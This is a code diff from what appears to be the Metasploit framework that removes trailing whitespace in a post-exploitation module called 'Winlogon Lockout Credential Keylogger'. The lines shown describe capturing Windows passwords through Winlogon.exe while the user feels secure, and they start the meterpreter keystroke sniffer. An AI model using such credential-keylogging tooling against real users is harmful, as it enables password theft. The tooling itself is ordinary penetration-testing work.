@@ -21,7 +21,7 @@ class Metasploit3 < Msf::Post
 		super( update_info(info,
 			'Name'         => 'Winlogon Lockout Credential Keylogger',
 			'Description'  => %q{
-					This module migrates and logs Microsoft Windows user's passwords via 
+					This module migrates and logs Microsoft Windows user's passwords via
 					Winlogon.exe. Using idle time and natural system changes to give a
 					false sense of security to the user.},
 			'License'      => MSF_LICENSE,
@@ -72,7 +72,7 @@ class Metasploit3 < Msf::Post
 	#Function for starting the keylogger
 	def startkeylogger(session)
 		begin
-			print_status("Starting the keystroke sniffer...") 
+			print_status("Starting the keystroke sniffer...")
 			session.ui.keyscan_start
 			return true
 		rescue
@@ -161,8 +161,8 @@ class Metasploit3 < Msf::Post
 
 
 		#Make sure we are on a Windows host
-		if client.platform !~ /win32|win64/ 
-				print_status "This module does not support this meterpreter type" 
+		if client.platform !~ /win32|win64/
+				print_status "This module does not support this meterpreter type"
 				return
 		end
 
